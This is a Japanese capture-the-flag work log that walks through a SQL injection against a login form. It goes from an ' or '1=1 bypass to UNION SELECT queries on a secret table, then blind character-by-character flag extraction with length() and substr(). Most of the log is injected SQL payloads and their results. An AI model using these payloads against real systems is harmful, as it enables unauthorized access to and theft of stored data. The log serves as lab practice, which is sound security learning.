##作業ログ
- password = a '1=1でログインは可能だが、flagは得ることができない

###後ろにselect文を追加しよう
- secretテーブルにflagがありそう
        CREATE TABLE IF NOT EXISTS secret (
            flag TEXT PRIMARY KEY
        );
- 普通にSQLcodeを追加すると一文のみしか使用できないと出る

###unionで一つにまとめよう

```sql
'UNION SELECT flag from secret where '1=1
SELECT * FROM users WHERE username='admin' AND password='a'or '1=1' UNION SELECT flag from secret where '1=1';
```
- SQL error: SELECTs to the left and right of UNION do not have the same number of result columns
- usersからはusernameとpasswordのふたつの値だが、secretからはflagしか得ていないためエラー

###二つ引数を与えると解決できそう
```sql
SELECT * FROM users WHERE username='admin' AND password='a'or '1=1' UNION SELECT flag, 1 from secret where '1=1';
```
- 文章は通ったが、flagの値が手に入らない。今回のログインフォームはflagの値を返さない。

###1文字ずつ確かめると良いのではないのか?
- likeで確かめる方法

```sql
SELECT * FROM users WHERE username='admin' AND password='a'or '1=1' UNION SELECT flag, 1 from secret where flag like 'Alpaca'--';
```
これでは値はわからない。
- 文字数の推測

```sql
SELECT * FROM users WHERE username='admin' AND password='a' UNION SELECT flag, 1 from secret where length(flag) = 16--';
#flagが16文字ならHello, user! と出力される。
SELECT * FROM users WHERE username='admin' AND password='a' UNION SELECT flag, 1 from secret where length(flag) = 17--';
#flagが16文字で一致しない場合はinvalid credentialsと表示される
```
- 文字の推測

```sql
SELECT * FROM users WHERE username='admin' AND password='a' UNION SELECT flag, 1 from secret where substr(flag, 1,1)= 'b'--';
SELECT * FROM users WHERE username='admin' AND password='a' UNION SELECT flag, 1 from secret where substr(flag, 1,8)= 'Alpaca{R'--';
```
        
